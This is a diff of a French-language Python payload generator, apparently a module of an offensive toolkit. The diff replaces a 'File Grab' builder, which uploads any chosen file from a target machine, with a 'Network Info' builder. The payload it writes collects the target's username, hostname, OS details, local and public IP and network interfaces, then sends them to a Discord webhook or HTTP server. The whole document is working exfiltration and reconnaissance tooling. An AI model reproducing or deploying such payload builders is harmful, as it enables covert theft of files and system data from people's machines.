@@ -1,6 +1,6 @@
-import time
 import os
 from colorama import Fore, Style, init
+import time
 
 init(autoreset=True)
 
@@ -9,20 +9,19 @@ def clear():
 
 def affichage():
     clear()
-    print(Fore.CYAN + "=== Configuration File Grab ===\n\n" + Style.RESET_ALL)
+    print(Fore.CYAN + "=== Configuration Network Info ===\n\n" + Style.RESET_ALL)
     print(f"""
           
           {Fore.YELLOW}Options : 
 {Fore.WHITE}
-    1. Chemin du fichier à récupérer
-    2. Délai avant l'envoi (en secondes)
-    3. Nouveau nom du fichier à l'envoi (optionnel)
+    1. Délai avant la collecte (en secondes)
+    2. Inclure les interfaces réseau détaillées
         
          
           {Fore.YELLOW}Sortie et envoi:
 {Fore.WHITE}
-    4. Envoi sur Discord
-    5. Envoi sur serveur HTTP
+    3. Envoi sur Discord
+    4. Envoi sur serveur HTTP
     
 {Fore.GREEN}
 Tapez : set <num> pour configurer
@@ -32,14 +31,13 @@ Tapez : exit pour quitter
             {Style.RESET_ALL}
                   """)
 
-def filegrab():
+def networkinfo():
     clear()
-    print("=== File Grab Configuration ===\n\n")
+    print("=== Network Info Configuration ===\n\n")
 
     choix = {
-        "Chemin du fichier": None,
-        "Délai avant envoi": None,
-        "Nouveau nom fichier": None,
+        "Délai avant collecte": None,
+        "Interfaces réseau détaillées": None,
         "Envoi sur Discord": None,
         "Envoi sur serveur HTTP": None,
     }
@@ -48,29 +46,9 @@ def filegrab():
     # Fonctions de configuration
     # -----------------------------------------------
 
-    def chemin_option():
-        clear()
-        fichier = input("Entrez le chemin complet du fichier à récupérer : ").strip()
-        if fichier == "":
-            print(Fore.RED + "Le chemin ne peut pas être vide." + Style.RESET_ALL)
-            time.sleep(1)
-            affichage()
-            return
-        # On vérifie que le fichier existe bien sur la machine configurante
-        if os.path.isfile(fichier):
-            choix["Chemin du fichier"] = fichier
-            print(Fore.GREEN + f"Fichier trouvé et défini : {fichier}" + Style.RESET_ALL)
-        else:
-            # On accepte quand même le chemin car le payload tournera sur une autre machine
-            print(Fore.YELLOW + "Attention : ce fichier n'existe pas sur cette machine." + Style.RESET_ALL)
-            print(Fore.YELLOW + "Il sera cherché sur la machine cible à l'exécution." + Style.RESET_ALL)
-            choix["Chemin du fichier"] = fichier
-        time.sleep(1)
-        affichage()
-
     def delai_option():
         clear()
-        delai = input("Délai avant l'envoi (secondes) : ")
+        delai = input("Délai avant la collecte (secondes) : ")
         try:
             delai = int(delai)
             if delai < 0:
@@ -78,7 +56,7 @@ def filegrab():
                 time.sleep(1)
                 affichage()
                 return
-            choix["Délai avant envoi"] = delai
+            choix["Délai avant collecte"] = delai
             print(f"Délai défini sur {delai} secondes.")
             time.sleep(1)
         except ValueError:
@@ -86,11 +64,11 @@ def filegrab():
             time.sleep(1)
         affichage()
 
-    def nom_option():
+    def interfaces_option():
         clear()
-        nom = input("Nouveau nom du fichier à l'envoi (laisser vide = nom original) : ").strip()
-        choix["Nouveau nom fichier"] = nom if nom != "" else None
-        print(f"Nom à l'envoi : {choix['Nouveau nom fichier'] or 'nom original conservé'}.")
+        reponse = input("Inclure les interfaces réseau détaillées (adresses MAC, IPv6...) ? (y/n) : ").lower()
+        choix["Interfaces réseau détaillées"] = reponse == 'y'
+        print(f"Interfaces détaillées : {'activées' if choix['Interfaces réseau détaillées'] else 'désactivées'}.")
         time.sleep(1)
         affichage()
 
@@ -122,11 +100,10 @@ def filegrab():
     # Liste des options (même ordre que le menu)
     # -----------------------------------------------
     options = [
-        ("Chemin du fichier",    chemin_option),
-        ("Délai avant envoi",    delai_option),
-        ("Nouveau nom fichier",  nom_option),
-        ("Envoi sur Discord",    discord_option),
-        ("Envoi sur serveur HTTP", http_option),
+        ("Délai avant collecte",            delai_option),
+        ("Interfaces réseau détaillées",    interfaces_option),
+        ("Envoi sur Discord",               discord_option),
+        ("Envoi sur serveur HTTP",          http_option),
     ]
 
     # -----------------------------------------------
@@ -134,84 +111,124 @@ def filegrab():
     # -----------------------------------------------
     def create_payload():
 
-        # Le chemin est obligatoire
-        if choix["Chemin du fichier"] is None:
-            print(Fore.RED + "Erreur : vous devez définir le chemin du fichier (option 1)." + Style.RESET_ALL)
-            input("\nAppuyez sur Entrée pour continuer...")
-            return
-
         # Au moins un mode d'envoi doit être choisi
         if choix["Envoi sur Discord"] is None and choix["Envoi sur serveur HTTP"] is None:
-            print(Fore.RED + "Erreur : vous devez choisir au moins un mode d'envoi (option 4 ou 5)." + Style.RESET_ALL)
+            print(Fore.RED + "Erreur : vous devez choisir au moins un mode d'envoi (option 3 ou 4)." + Style.RESET_ALL)
             input("\nAppuyez sur Entrée pour continuer...")
             return
 
         # Dossier de sortie
         payload_dir  = os.path.join("Option", "modules", "payload", "payload_created")
-        payload_path = os.path.join(payload_dir, "filegrab_payload.py")
+        payload_path = os.path.join(payload_dir, "networkinfo_payload.py")
         os.makedirs(payload_dir, exist_ok=True)
 
         with open(payload_path, "w", encoding="utf-8") as f:
             f.write("import os\n")
             f.write("import time\n")
+            f.write("import getpass\n")
+            f.write("import platform\n")
+            f.write("import socket\n")
             f.write("import requests\n")
+            if choix["Interfaces réseau détaillées"]:
+                # psutil permet de lister les interfaces avec adresses MAC et IPv6
+                f.write("import psutil\n")
             f.write("\n")
 
             # --- Variables de configuration ---
             f.write("# ============================================================\n")
             f.write("# Configuration générée automatiquement\n")
             f.write("# ============================================================\n")
-            f.write(f"FICHIER         = {repr(choix['Chemin du fichier'])}\n")
-            f.write(f"DELAI           = {choix['Délai avant envoi'] or 0}\n")
-            f.write(f"NOM_ENVOI       = {repr(choix['Nouveau nom fichier'])}\n")
+            f.write(f"DELAI               = {choix['Délai avant collecte'] or 0}\n")
+            f.write(f"INTERFACES_DETAILS  = {choix['Interfaces réseau détaillées'] if choix['Interfaces réseau détaillées'] is not None else False}\n")
 
             if choix["Envoi sur Discord"]:
-                f.write(f"DISCORD_WEBHOOK = {repr(choix['Envoi sur Discord'])}\n")
+                f.write(f"DISCORD_WEBHOOK     = {repr(choix['Envoi sur Discord'])}\n")
             else:
-                f.write("DISCORD_WEBHOOK = None\n")
+                f.write("DISCORD_WEBHOOK     = None\n")
 
             if choix["Envoi sur serveur HTTP"]:
-                f.write(f"HTTP_URL        = {repr(choix['Envoi sur serveur HTTP'])}\n")
+                f.write(f"HTTP_URL            = {repr(choix['Envoi sur serveur HTTP'])}\n")
             else:
-                f.write("HTTP_URL        = None\n")
+                f.write("HTTP_URL            = None\n")
 
             f.write("\n")
 
-            # --- Logique du grab ---
+            # --- Logique de collecte ---
             f.write("# ============================================================\n")
-            f.write("# File Grab\n")
+            f.write("# Collecte des informations réseau\n")
             f.write("# ============================================================\n\n")
 
-            f.write("def lancer_filegrab():\n")
+            f.write("def collecter_infos():\n")
+            f.write('    """\n')
+            f.write("    Collecte les informations système et réseau de la machine.\n")
+            f.write("    Retourne un dictionnaire avec toutes les données.\n")
+            f.write('    """\n')
+            f.write("    infos = {}\n\n")
 
-            f.write("    # Délai avant l'envoi\n")
+            f.write("    # Infos système de base\n")
+            f.write("    infos['Utilisateur']   = getpass.getuser()\n")
+            f.write("    infos['Système']       = platform.system()\n")
+            f.write("    infos['Nom machine']   = platform.node()\n")
+            f.write("    infos['Release']       = platform.release()\n")
+            f.write("    infos['Version OS']    = platform.version()\n")
+            f.write("    infos['Architecture']  = platform.machine()\n")
+            f.write("    infos['Processeur']    = platform.processor()\n\n")
+
+            f.write("    # IP locale\n")
+            f.write("    try:\n")
+            f.write("        infos['IP locale'] = socket.gethostbyname(socket.gethostname())\n")
+            f.write("    except Exception:\n")
+            f.write("        infos['IP locale'] = 'N/A'\n\n")
+
+            f.write("    # IP publique (via service externe)\n")
+            f.write("    try:\n")
+            f.write("        infos['IP publique'] = requests.get('https://api.ipify.org', timeout=5).text\n")
+            f.write("    except Exception:\n")
+            f.write("        infos['IP publique'] = 'N/A'\n\n")
+
+            if choix["Interfaces réseau détaillées"]:
+                f.write("    # Interfaces réseau détaillées (psutil)\n")
+                f.write("    if INTERFACES_DETAILS:\n")
+                f.write("        try:\n")
+                f.write("            interfaces = psutil.net_if_addrs()\n")
+                f.write("            lignes = []\n")
+                f.write("            for nom_if, adresses in interfaces.items():\n")
+                f.write("                for addr in adresses:\n")
+                f.write("                    lignes.append(f\"{nom_if} | {addr.family.name} | {addr.address}\")\n")
+                f.write("            infos['Interfaces'] = '\\n'.join(lignes)\n")
+                f.write("        except Exception as e:\n")
+                f.write("            infos['Interfaces'] = f'Erreur : {e}'\n\n")
+
+            f.write("    return infos\n\n")
+
+            # --- Formatage du rapport ---
+            f.write("def formater_rapport(infos):\n")
+            f.write('    """Met en forme les infos pour l\'affichage et l\'envoi."""\n')
+            f.write("    lignes = [f\"{cle}: {valeur}\" for cle, valeur in infos.items()]\n")
+            f.write("    return '\\n'.join(lignes)\n\n")
+
+            # --- Fonction principale ---
+            f.write("def lancer_networkinfo():\n")
+
             f.write("    if DELAI > 0:\n")
             f.write("        print(f\"Attente de {DELAI} secondes...\")\n")
             f.write("        time.sleep(DELAI)\n\n")
 
-            f.write("    # Vérification que le fichier existe\n")
-            f.write("    if not os.path.isfile(FICHIER):\n")
-            f.write("        print(f\"Erreur : fichier introuvable -> {FICHIER}\")\n")
-            f.write("        return\n\n")
+            f.write("    print(\"Collecte des informations réseau...\\n\")\n")
+            f.write("    infos   = collecter_infos()\n")
+            f.write("    rapport = formater_rapport(infos)\n\n")
 
-            f.write("    # Nom du fichier à l'envoi\n")
-            f.write("    nom_final = NOM_ENVOI if NOM_ENVOI else os.path.basename(FICHIER)\n\n")
-
-            f.write("    print(f\"Fichier trouvé : {FICHIER}\")\n")
-            f.write("    print(f\"Envoi sous le nom : {nom_final}\")\n\n")
+            f.write("    # Affichage local\n")
+            f.write("    print(rapport)\n\n")
 
             # --- Envoi Discord ---
             f.write("    # ---- Envoi Discord (optionnel) ----\n")
             f.write("    if DISCORD_WEBHOOK:\n")
+            f.write("        # Discord limite les messages à 2000 caractères\n")
+            f.write("        message = f\"**Network Info**\\n```\\n{rapport[:1900]}\\n```\"\n")
             f.write("        try:\n")
-            f.write("            with open(FICHIER, 'rb') as fichier_obj:\n")
-            f.write("                # Discord accepte les fichiers via 'files' dans multipart\n")
-            f.write("                reponse = requests.post(\n")
-            f.write("                    DISCORD_WEBHOOK,\n")
-            f.write("                    files={'file': (nom_final, fichier_obj)},\n")
-            f.write("                    data={'content': f'Fichier récupéré : {nom_final}'}\n")
-            f.write("                )\n")
-            f.write("            print(f\"Envoi Discord : statut {reponse.status_code}\")\n")
+            f.write("            requests.post(DISCORD_WEBHOOK, json={'content': message})\n")
+            f.write("            print(\"Rapport envoyé sur Discord.\")\n")
             f.write("        except Exception as e:\n")
             f.write("            print(f\"Erreur envoi Discord : {e}\")\n\n")
 
@@ -219,18 +236,14 @@ def filegrab():
             f.write("    # ---- Envoi HTTP (optionnel) ----\n")
             f.write("    if HTTP_URL:\n")
             f.write("        try:\n")
-            f.write("            with open(FICHIER, 'rb') as fichier_obj:\n")
-            f.write("                reponse = requests.post(\n")
-            f.write("                    HTTP_URL,\n")
-            f.write("                    files={'file': (nom_final, fichier_obj)}\n")
-            f.write("                )\n")
-            f.write("            print(f\"Envoi HTTP : statut {reponse.status_code}\")\n")
+            f.write("            requests.post(HTTP_URL, json=infos)\n")
+            f.write("            print(\"Rapport envoyé sur le serveur HTTP.\")\n")
             f.write("        except Exception as e:\n")
             f.write("            print(f\"Erreur envoi HTTP : {e}\")\n\n")
 
             f.write("# Point d'entrée\n")
             f.write("if __name__ == '__main__':\n")
-            f.write("    lancer_filegrab()\n")
+            f.write("    lancer_networkinfo()\n")
 
         print(Fore.GREEN + f"Payload généré dans {payload_path}" + Style.RESET_ALL)
         input("\nAppuyez sur Entrée pour continuer...")
@@ -259,10 +272,10 @@ def filegrab():
 
         elif cmd.lower() == "show":
             clear()
-            print(Fore.CYAN + "\nConfiguration actuelle du module File Grab :\n" + Style.RESET_ALL)
+            print(Fore.CYAN + "\nConfiguration actuelle du module Network Info :\n" + Style.RESET_ALL)
             for option, value in choix.items():
                 couleur = Fore.GREEN if value is not None else Fore.RED
-                print(f"  {option:30s} : {couleur}{value}{Style.RESET_ALL}")
+                print(f"  {option:35s} : {couleur}{value}{Style.RESET_ALL}")
             input("\nAppuyez sur Entrée pour continuer...")
 
         elif cmd.lower() == "create":
@@ -275,4 +288,4 @@ def filegrab():
 
 # Point d'entrée si lancé directement
 if __name__ == "__main__":
-    filegrab()
+    networkinfo()
